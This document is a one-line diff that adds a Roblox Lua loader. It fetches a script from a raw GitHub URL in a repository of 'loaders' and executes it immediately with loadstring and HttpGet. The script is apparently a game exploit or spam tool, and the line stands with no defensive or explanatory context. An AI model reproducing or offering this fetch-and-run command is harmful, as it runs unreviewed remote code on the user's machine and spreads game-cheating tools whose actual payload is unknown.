@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/electricity-bricklayer-spam3-tzz0m4m0i8p6jh.lua"))()
